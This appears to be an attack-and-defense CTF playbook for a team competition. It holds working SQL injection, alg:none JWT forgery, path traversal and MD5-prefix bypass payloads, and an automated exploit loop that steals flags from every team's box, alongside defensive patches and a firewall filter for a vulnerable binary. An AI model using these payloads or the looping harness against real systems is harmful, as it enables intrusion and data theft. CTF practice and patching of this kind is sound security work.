# AFRICC A&D Playbook for the NCTF26 Finale

Built from **static read-only analysis** of the AFRICC ICC dry-run artifacts
(`#ad-2025-dry-run`, 18/10/2025) under
`workspaces/nctf26-finale/discord-harvest/downloads/africc-ad-live/`.
Nothing here was executed, built, or run; `prog` was characterized with
`file` only. All source is untrusted CTF code.

The dry-run mirrors the finale's structure: per-team vulnerable Docker boxes,
a `patchable/` directory you edit to defend, two flags per box, and a
gRPC-style flag-submit API. Use this as the drop-in attack+defend plan.

> **Important correction to the SOURCES manifest.** The manifest says the
> `/todos` SQLi "lives in `apiRoutes.js`". It does **not**. `patchable/apiRoutes.js`
> `/api/todos` is **parameterized and safe**. The SQLi the `ad_exploit_submit_loop_Ax0lotl.py`
> script actually hits is the **top-level `POST /todos` in `patchable/app.js` line 69**
> (string-interpolated `INSERT`). Patch `app.js`, not `apiRoutes.js`, to kill it.
> Details and proof in Sections 2-3.

---

## 1. A&D format recap (how a box is laid out, how you submit)

### Box layout (both services, identical shape)
- Each team runs **one vulnerable box** reachable at `10.3.<team>.2`.
  Source: `ad_exploit_submit_loop_Ax0lotl.py:8` (`ips = [f"10.3.{i}.2" for i in range(2,9)]`)
  and `ad_jwt_attack_script.py:18` (`range(2,21)` → teams 2-20).
- Service port is published by a `simple-network-proxy` sidecar that bridges an
  internal-only network to a public interface:
  - **web (`juice-todo`)**: `8080:8080` — `juice-todo/compose.yaml:22-36`.
  - **pwn (`pwn-sample-kun`)**: `31337:31337` — `pwn-sample-kun/compose.yaml:21-35`.
- The `patchable/` directory is the **only thing you edit to defend**:
  - web: `patchable/{app.js, apiRoutes.js, adminRoutes.js, views/*.ejs, public/*}`
    (`juice-todo/Dockerfile:12` copies `./patchable/` → `/app/`).
  - pwn: `patchable/firewall_filter.py` only — you cannot touch `prog`, `prog.c`,
    or `prog_wrapper.py` (`pwn-sample-kun/README.txt:11-15`).
- **Two flags per box.** They are bind-mounted read-only:
  - web: `/flag1` and `/flag2` (`juice-todo/compose.yaml:6-14`). `flag1` is the
    app/API secret and seeds the SQLi-reachable `flags` table; `flag2` is the
    admin-only flag. Dummy values on the dry-run: `ICC{dummyflag1}`, `ICC{dummyflag2}`.
  - pwn: a single `/flag` (`pwn-sample-kun/compose.yaml:8-12`), dummy `ICC{dummy flag for test}`.
- Flag format (what to grep in responses): `ICC\{[A-Za-z0-9_]+\}`
  (`ad_exploit_submit_loop_Ax0lotl.py:20`, `ad_jwt_attack_script.py:98`).
  **For the Lomé finale this becomes `NCTF\{...\}`** — swap the regex, see Section 5.

### The ICC submit API
From `ad_jwt_attack_script.py:58-77` and `ad_exploit_submit_loop_Ax0lotl.py:26-35`:
- **Endpoint** (Connect/gRPC-style HTTP): `POST https://icc-test.ierae-zero.day/core.v1.FrontendService/SubmitFlags`
- **Auth**: header `Authorization: Bearer <team_token>` (dry-run token
  `token_1q6TtgK2DXM8CpNZbfn8G8i7MBj1p2ob6` — practice token, not a live secret).
- **Body (JSON)**: `{"flags": ["ICC{...}", ...]}` — note the **list** under key
  `"flags"`, you can batch several flags per call.
- **Response (JSON)**: `{"submitFlagResults": [{"status": "<STATUS>"}]}`
  (`ad_jwt_attack_script.py:69-73`). `resp.ok` (HTTP 2xx) plus a per-flag `status`.

### Round / tick timing
- Attack cadence used by the dry-run framework: **120 s tick**
  (`ad_jwt_attack_script.py:21`, `self.tick_interval = 120`), 0.3 s pause
  between teams (`:152`), graceful SIGINT/SIGTERM shutdown (`:28-36`), and
  running stats (flags captured / attacks / successful teams, `:168-187`).
- pwn box runtime limits (nsjail, `pwn-sample-kun/Dockerfile:43-51`):
  `port 31337`, `max_conns_per_ip: 20`, `time_limit: 60`, `rlimit_as: 64 (MB)`,
  `rlimit_fsize: 1`. Keep exploit connections short — the box drops you at 60 s.

---

## 2. juice-todo (web) — ATTACK

Four independent flag-leak paths. Two are one-shot and reliable; use those first.

### 2A. SQLi → `flag1` (the Ax0lotl loop) — **primary, in `app.js` not `apiRoutes.js`**
`patchable/app.js:33-46` reads `/flag1` on boot and inserts it into a `flags`
table; `app.js:63-76` then builds the insert with raw string interpolation:

```js
// app.js:69  — THE BUG
db.run(`INSERT INTO todos (task) VALUES ('${task}')`, function(err) { ... });
```

SQLite `||` is string concatenation. The dry-run payload
(`ad_exploit_submit_loop_Ax0lotl.py:15`):

```
task = '|| (select flag from flags) ||'
```

makes the stored value `'' || (select flag from flags) || ''` → the row's `task`
becomes the flag string. `POST /todos` 302-redirects to `GET /`
(`app.js:74`), which renders every todo via `index.ejs:112` (`<%= todo.task %>`),
so the flag comes back in the HTML. Concrete request:

```
POST http://10.3.<team>.2:8080/todos      (form-urlencoded)
task=' || (select flag from flags) || '
# follow the redirect to GET / ; grep ICC\{[A-Za-z0-9_]+\} in the body
```

(`requests.post` follows the redirect by default, so the Ax0lotl loop reads the
flag straight out of `r.text`.) This leaks **flag1** only — `flag2` is never put
in the DB.

### 2B. JWT `alg:none` forgery → `flag2` (the `AutomatedJWTAttacker` path)
`patchable/apiRoutes.js:24-32` "verifies" tokens with `jwt.decode` (no signature
check) instead of `jwt.verify`:

```js
// apiRoutes.js:26 — THE BUG
const decoded = jwt.decode(token, { complete: true });
return decoded.payload;          // signature NEVER checked
```

`apiAuth` then trusts `decoded.roles` (`:42-48`) and `hasRole('admin')` gates the
flag endpoint (`:56-63`, `:133-136`, which reads `/flag2`). So any forged token
with `roles:["admin"]` wins. `ad_jwt_attack_script.py:43-56` forges exactly that:

```
header  = {"alg":"none","typ":"JWT"}
payload = {"user":"attacker","roles":["admin"]}
token   = base64url(header) + "." + base64url(payload) + ".sig"

GET http://10.3.<team>.2:8080/api/admin/flag
Authorization: Bearer <forged token>
# JSON response: {"message":"Admin operation","flag":"ICC{...}"}  → flag2
```

### 2C. Admin path traversal → `flag1` and `flag2` (arbitrary file read)
`patchable/adminRoutes.js:48-68` `GET /admin/file?name=` does
`fs.readFileSync(path.join('/', fileName))` with **no sanitization** and **no
character whitelist** (unlike the pwn binary's file ops). It is gated only by the
weak `isAuthenticated` below. Read either flag directly:

```
GET /admin/file?secret=<bypass>&name=flag1     → flag1
GET /admin/file?secret=<bypass>&name=flag2     → flag2
```

### 2D. 5-hex-char MD5 prefix bypass + hash leak (unlocks 2C)
`adminRoutes.js:14-24`: `isAuthenticated` only compares the **first 5 hex chars**
of `md5(secret)` against `md5(flag1)` — a ~20-bit check (~10^6 brute). Worse, the
401 body **leaks the full `ADMIN_HASH`** (`adminRoutes.js:29`, `:50`:
`"... Hash: ${ADMIN_HASH}"`). So:
1. `GET /admin` → 401 body reveals `md5(flag1)`; take its first 5 hex chars.
2. Locally brute any string whose md5 shares that 5-char prefix (fast).
3. Use it as `secret=` in 2C to read `/flag2` (and `/flag1`).

**Recommended attack order:** 2A for flag1 (cheapest, one unauthenticated POST),
2B for flag2 (one GET, no brute). Keep 2C/2D as fallback if a defender patches the
JWT path but forgets `adminRoutes.js`.

---

## 3. juice-todo (web) — DEFEND (minimal, SLA-safe patches)

The SLA checker will add todos (`POST /todos` → list on `/`), and likely exercise
`/api/token` → `/api/todos` and `/admin`. Keep all legit behavior; only remove the
injection/forgery.

### Patch 1 — kill the SQLi in `app.js` (parameterize). **This is the Ax0lotl kill.**
`patchable/app.js:63-76`, change only the `db.run`:

```js
// BEFORE  (app.js:69)
db.run(`INSERT INTO todos (task) VALUES ('${task}')`, function(err) {

// AFTER
db.run('INSERT INTO todos (task) VALUES (?)', [task], function(err) {
```

Identical behavior for benign tasks (the SLA checker's "Buy milk" still inserts and
renders); the `' || (select...) || '` payload is now stored as a literal string, no
query execution. **Do not** touch the empty-check (`app.js:64-67`) or the
`res.redirect('/')` (`:74`) — the checker depends on both. `apiRoutes.js`
`/api/todos` (`:91-104`) is **already** parameterized — leave it alone.

### Patch 2 — kill the JWT forgery in `apiRoutes.js` (verify the signature). **flag2 kill.**
`patchable/apiRoutes.js:24-32`:

```js
// BEFORE
function verifyToken(token) {
  try {
    const decoded = jwt.decode(token, { complete: true });
    return decoded.payload;
  } catch (err) {
    console.error('JWT verification error:', err.message);
    return null;
  }
}

// AFTER
function verifyToken(token) {
  try {
    return jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] });
  } catch (err) {
    console.error('JWT verification error:', err.message);
    return null;
  }
}
```

`jwt.verify` returns the payload object directly, so `decoded.user` / `decoded.roles`
in `apiAuth` (`:42-48`) keep working. `JWT_SECRET` is the same secret `/api/token`
signs with (`:17`, `:20-22`), so **legitimately issued tokens still pass** — the SLA
`/api/token`→`/api/*` flow is unaffected. Pinning `algorithms:['HS256']` blocks both
`alg:none` and HS/RS confusion. **Do not** change `generateToken`/`/api/token`.

### Patch 3 (strongly recommended) — close the admin file-read fallback in `adminRoutes.js`
Even with Patches 1-2, 2C/2D still leak both flags. Minimal hardening of
`patchable/adminRoutes.js`:
- Stop leaking the hash: in both 401 responses (`:29`, `:50`) drop the
  `Hash: ${ADMIN_HASH}` suffix.
- Make the secret check full-length: `adminRoutes.js:19`, compare the **whole**
  hash, not `.substring(0,5)`:
  ```js
  if (secretHash === ADMIN_HASH) {   // was: .substring(0,5) === ...substring(0,5)
  ```
- Constrain `/admin/file`: after `:53`, reject traversal before reading:
  ```js
  if (!/^[A-Za-z0-9._-]+$/.test(fileName) || fileName.includes('..')) {
    return res.status(400).send('Invalid file name');
  }
  ```
  If the SLA checker genuinely needs `/admin/file`, it uses a known benign name that
  passes this whitelist; if it never calls `/admin/file`, this is pure upside.

**What NOT to break:** the `/` todo list render, `POST /todos` redirect, the
empty-task 400s, `/api/token` issuance and `/api/todos` behavior, and `view engine`
set to ejs (`app.js:16-17`). Patch only the four lines above.

---

## 4. pwn-sample-kun — ATTACK & DEFEND

### The binary (`prog`, static characterization only)
`file prog` → `ELF 64-bit x86-64, dynamically linked, not stripped`. The build
line in `prog.c:2` is `gcc ... -fno-stack-protector -no-pie` → **no stack canary,
no PIE** (fixed addresses), NX on by default. Menu in `prog.c:195-223`. It was
**not executed.** `prog.c` exposes a buffet of intentional bugs:

- **cmd 7 `file_read` — path traversal → direct `/flag` read (easiest win).**
  `prog.c:140-163`: builds `name = "/data/" + input`, strips newline, and — unlike
  `file_write` (`:108-114`) — applies **no character validation**. Sending
  `../flag` opens `fopen("/data/../flag")` = `/flag` and prints it. One round-trip,
  no memory corruption. **This is the pwn flag path.**
- **cmd 1 `stack_bof`** (`:18-24`): `char buf[16]` with `fgets(buf, 1000, stdin)`
  → stack overflow, no canary/PIE → ret2 (libc leak available via cmd 9).
- **cmd 2 `fsb`** (`:26-32`): `printf(buf)` → format string (leak/write).
- **cmd 5 `heap_write`** (`:78-96`): `fgets(ptrs[idx], buf_sizes[idx]+1000, ...)`
  → heap overflow past the allocation; combined with cmd 4 `do_free` (`:64-76`,
  no pointer clearing → double-free/UAF).
- **cmd 8 `admin_backdoor`** (`:167-189`): `system(command)` gated by
  `sha256(password)==correct_hash`; also `command[64]` filled by
  `fgets(command, 104, ...)` → stack overflow. RCE if the preimage is known.
- **cmd 9 `address_leak`** (`:191-193`): leaks `printf`'s address (libc base).
  Marked "intended feature, not a vulnerability" (`:209`) — **not patchable**, and
  it's the leak primitive that makes cmd 1/2 practical.

### How the defense model works (`prog_wrapper.py` + `firewall_filter.py`)
- `prog_wrapper.py:21-23` spawns **two nsjail'd processes**: the firewall and
  `prog`. Each input line goes to the firewall first; the wrapper reads the
  firewall's verdict and only forwards the line to `prog` on anything that isn't
  `KILL\n` (`:25-44`).
- The firewall (`patchable/firewall_filter.py`) is a **line-by-line pass/kill
  filter that cannot modify input** (`firewall_filter.py:13-23`). It prints
  `PASS` to forward a line, `KILL` to tear down the connection. It must **mirror
  prog's state machine** itself (which `fgets` each line feeds) — the file's own
  comments warn about this (`:25-38`), including the `atoll("1garbage")==1`
  request-smuggling trap.
- **Current state: the firewall enforces nothing** — every `unsafe_*` handler just
  reads the right number of lines and prints `PASS` (`:92-159`). So `../flag` sails
  through. That's the dry-run's "unpatched" baseline.
- Two hard rules from the file (`:25-38`): (1) **the firewall must never crash** —
  if it dies, `prog_wrapper` forwards everything unconditionally and all defense is
  off for that connection (`:30-31`); wrap handlers in try/except. (2) Keep the
  firewall's `fgets` sizes in lockstep with `prog`'s or an attacker desyncs it.

### Minimal firewall hardening (blocks the flag read, keeps SLA)
Edit only `patchable/firewall_filter.py`. The must-have is blocking the cmd-7
traversal; the rest is cheap defense-in-depth. All keep `PASS` for benign input.

```python
# 1) cmd 7 file_read: block path traversal to /flag.  (was: firewall_filter.py:147-150)
def unsafe_file_read():
  name, has_end = fgets(94)
  # prog prepends "/data/"; a legit read uses a plain name. Any '/', '..' or
  # non-alphanumeric byte in the suffix is an escape attempt -> KILL.
  suffix = name.rstrip(b'\r\n')
  if (b'/' in suffix) or (b'..' in suffix) or (not suffix.isalnum() and suffix != b''):
    print("KILL")
    return
  if has_end:
    print("PASS")

# 2) cmd 1 stack_bof: buf is 16 bytes, prompt says "<=15".  (was: :92-95)
def unsafe_stack_bof():
  line, has_end = fgets(1000)
  if len(line.rstrip(b'\r\n')) > 15:
    print("KILL")
    return
  if has_end:
    print("PASS")

# 3) cmd 2 fsb: printf(buf) format string -> forbid '%'.  (was: :97-101)
def unsafe_fsb():
  line, has_end = fgets(1024)
  if b'%' in line:
    print("KILL")
    return
  if has_end:
    print("PASS")

# 4) cmd 8 admin_backdoor: not a legit feature; command fgets overflows.  (was: :152-159)
def unsafe_admin_backdoor():
  password, has_end = fgets(100)
  if has_end: print("PASS")
  command, has_end = fgets(104)
  if len(command.rstrip(b'\r\n')) > 63:   # command[64] in prog
    print("KILL")
    return
  if has_end:
    print("PASS")
```

Plus wrap `main()`'s dispatch body in `try/except Exception: pass` so a malformed
line never kills the firewall itself (rule 1 above). **Do not** change `read_ll`'s
`atoll`-compatible parsing (`:65-87`) or the per-handler `fgets` sizes — those keep
the firewall's state aligned with `prog`. If the SLA checker only writes/reads
alphabetic names under `/data` and sends short inputs (the benign menu flow), every
one of these KILLs is unreachable on legit traffic.

---

## 5. Reusable attack harness (drop into the repo toolkit)

The repo already has the right skeleton: `src/tools/ctf/attack_defense_toolkit/`
(`exploit_runner.py` loops an `exploit(ip)` module across `config.TEAMS` every tick
and auto-submits via `submitter.py`). Distill `ad_jwt_attack_script.py` into a
parameterized exploit module rather than a standalone script.

### 5a. `config.py` — set once at the finale
```python
TEAMS       = [f"10.3.{i}.2" for i in range(2, 21)]   # from ad_jwt_attack_script.py:18
OWN_IP      = "10.3.<ours>.2"                          # skip-own-IP (see 5b)
TICK_SECONDS = 120                                     # ad_jwt_attack_script.py:21
FLAG_REGEX  = r"NCTF\{[^}]+\}"                         # Lomé format (was ICC{...})
```
The ICC submit API differs from the toolkit's default single-flag JSON. Point
`submitter.py` at it — note the key is **`flags` (a list)** and the response is
`submitFlagResults`:
```python
SUBMIT_URL     = "https://<arena>/core.v1.FrontendService/SubmitFlags"
SUBMIT_METHOD  = "POST"
SUBMIT_JSON_KEY = "flags"      # <-- list-valued; see submitter note below
SUBMIT_HEADERS = {"Authorization": "Bearer <TEAM_TOKEN>"}
```
`submitter.py:_submit_http` sends `{SUBMIT_JSON_KEY: flag}` (single string). The ICC
API wants `{"flags": [flag]}`. Either wrap the value in a list there, or keep the
per-flag loop and send `{"flags":[flag]}`. Both work; the list form lets you batch.

### 5b. `exploits/juice_todo.py` — parameterized, exploit-first
Distilled from both scripts (SQLi for flag1 + JWT forgery for flag2), honoring the
house doctrine (grab flags every tick; patching is a separate track):
```python
import re, base64, json, requests, config
PORT = 8080
FLAG_RE = re.compile(config.FLAG_REGEX)

def _forge_jwt():                      # ad_jwt_attack_script.py:43-56
    b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b'=').decode()
    h = b64(json.dumps({"alg":"none","typ":"JWT"}).encode())
    p = b64(json.dumps({"user":"x","roles":["admin"]}).encode())
    return f"{h}.{p}.sig"

def exploit(ip: str):
    if ip == config.OWN_IP:            # skip-own-IP
        return None
    flags, base = [], f"http://{ip}:{PORT}"
    try:                               # flag1: SQLi (app.js:69)
        r = requests.post(f"{base}/todos",
                          data={"task": "' || (select flag from flags) || '"},
                          timeout=5)
        flags += FLAG_RE.findall(r.text)
    except requests.RequestException:
        pass
    try:                               # flag2: JWT alg:none (apiRoutes.js:26)
        r = requests.get(f"{base}/api/admin/flag",
                         headers={"Authorization": f"Bearer {_forge_jwt()}"},
                         timeout=5)
        flags += FLAG_RE.findall(r.text)
    except requests.RequestException:
        pass
    return flags or None
```
Run it: `python3 exploit_runner.py exploits/juice_todo.py` (continuous, auto-submit,
dedup via `submitted_flags.txt`). Add a sibling `exploits/pwn_sample.py` whose
`exploit(ip)` opens `remote(ip, 31337)`, sends menu `7` then `../flag`, and
`FLAG_RE.findall`s the reply (per Section 4) — but confirm it against your own box
first (`--once --targets 127.0.0.1`).

### 5c. `koth_auto.sh` hook
`src/tools/ctf/koth_auto.sh` already takes a `FLAG_REGEX` env override and runs a
background hold/exploit loop. For A&D (not KOTH king-time), the exploit+submit loop
lives in `attack_defense_toolkit/exploit_runner.py`; use `koth_auto.sh` only for its
recon/SSH-hunt phase if a box turns out to be a full host. Keep the toolkit's
"one tmux pane per service exploit, patch on a separate pane" layout
(`attack_defense_toolkit/README.md`). **Doctrine stays exploit-first**: flags are
scored every tick, a patch only stops the bleeding — never hold flag submission to
finish a patch.

---

## 6. Round-1 checklist (first 5 minutes)

1. **t+0: confirm reachability & grab one flag by hand.** Hit your first opponent's
   web box: `curl -s --data-urlencode "task=' || (select flag from flags) || '" \
   http://10.3.<t>.2:8080/todos -L | grep -Eo 'NCTF\{[^}]+\}'` (flag1), and
   `curl -s http://10.3.<t>.2:8080/api/admin/flag -H "Authorization: Bearer <forged>"`
   (flag2). Confirms the dry-run bugs survived into the finale image.
2. **t+1: confirm the submit API.** Submit that one flag manually:
   `POST .../core.v1.FrontendService/SubmitFlags`, `Authorization: Bearer <team_token>`,
   body `{"flags":["NCTF{...}"]}`. Verify HTTP 2xx and a positive `submitFlagResults[].status`.
   **Nothing else proceeds until a single flag scores.**
3. **t+2: launch the auto loop.** Set `config.py` (TEAMS, OWN_IP, FLAG_REGEX,
   SUBMIT_URL+token), then `python3 exploit_runner.py exploits/juice_todo.py` in a
   tmux pane. Watch the first tick land flags for every live team.
4. **t+3: patch your OWN web box** (exploit-first doctrine — attack loop is already
   running): apply Section 3 Patch 1 (`app.js` parameterize) + Patch 2
   (`apiRoutes.js` `jwt.verify`), then Patch 3 if time. Commit to `patchable/`,
   redeploy, and re-run the Ax0lotl SQLi + JWT GET against your own IP to confirm
   **both now fail** while `POST /todos`→`/` and `/api/token`→`/api/todos` still work
   (SLA intact).
5. **t+4: patch your OWN pwn box.** Edit `patchable/firewall_filter.py` with the
   Section 4 hardening (cmd-7 traversal KILL first, then 1/2/8, wrap main in
   try/except). Re-check that a benign `/data/<alnum>` write+read still returns
   `PASS` so the SLA checker passes; confirm `7` + `../flag` now yields "Firewall
   blocked".
6. **t+5+: steady state.** Leave `exploit_runner.py` looping every 120 s across all
   teams (dedup handles repeats). Run `pcap_watch.py` on your service ports to see
   what opponents throw at you and catch any vuln you missed; keep flag submission
   running the entire round regardless of patch status.
```
